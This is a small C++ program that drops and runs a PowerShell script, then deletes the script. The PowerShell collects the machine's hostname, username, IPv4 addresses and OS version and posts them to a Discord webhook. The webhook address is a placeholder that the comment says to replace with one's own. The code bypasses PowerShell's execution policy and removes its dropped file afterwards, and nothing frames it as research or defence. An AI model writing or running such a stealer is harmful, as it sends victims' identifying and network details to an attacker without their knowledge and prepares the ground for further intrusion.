// note: sometimes the compiled code must be ran from desktop

#include <iostream>
#include <fstream>
#include <cstdlib>

int main() {
    const std::string psScript =
        "$url = \"https://discord.com/api/webhooks/your-custom-webhook\";\n"   // make sure to replace with your own webhook url
        "$hostname = $env:COMPUTERNAME;\n"
        "$username = $env:USERNAME;\n"
        "$ipv4 = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notlike \"*Loopback*\" }).IPAddress;\n"
        "$os = (Get-WmiObject Win32_OperatingSystem).Caption;\n"
        "$userAgent = \"PowerShell/$(($PSVersionTable.PSVersion).ToString()) ($os)\";\n"
        "$payload = @{ content = \"**System Information Report**\"; embeds = @(@{ title = \"Extracted System Info\"; color = 16711680; fields = @(@{ name = \"Hostname\"; value = $hostname; inline = $true }, @{ name = \"Username\"; value = $username; inline = $true }, @{ name = \"IPv4 Address\"; value = ($ipv4 -join \", \"); inline = $true }, @{ name = \"OS Version\"; value = $os; inline = $true }, @{ name = \"User-Agent\"; value = $userAgent; inline = $false }) }) };\n"
        "$payload = $payload | ConvertTo-Json -Depth 10 -Compress;\n"
        "Write-Output $payload;\n"
        "Invoke-RestMethod -Uri $url -Method Post -Body $payload -ContentType \"application/json\";";

    std::ofstream psFile("test.ps1");
    if (!psFile.is_open()) {
        std::cerr << "failed" << std::endl;
        return 1;
    }


    psFile << psScript;
    psFile.close();
    system("powershell -NoProfile -ExecutionPolicy Bypass -File test.ps1");
    std::remove("test.ps1");
    return 0;
}